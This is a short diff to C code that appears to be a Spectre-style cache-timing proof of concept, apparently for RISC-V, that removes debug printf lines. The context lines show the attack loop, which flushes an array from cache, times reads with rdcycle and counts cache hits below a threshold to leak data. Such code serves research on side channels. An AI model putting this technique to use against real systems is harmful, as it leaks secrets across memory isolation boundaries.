@@ -86,7 +86,6 @@ int main(void){
 
         // run the attack on the same idx ATTACK_SAME_ROUNDS times
         for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
-            printf("Round=%lu\n",atkRound);
             // make sure array you read from is not in the cache
             flushCache((uint64_t)array2, sizeof(array2));
 
@@ -119,11 +118,9 @@ int main(void){
                 dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                 diff = (rdcycle() - start);
                 if ( diff < CACHE_HIT_THRESHOLD ){
-                    printf("Block %lu\t", i);
                     results[i] += 1;
                 }
             }
-            printf("\n");
         }
         
         // get highest and second highest result hit values
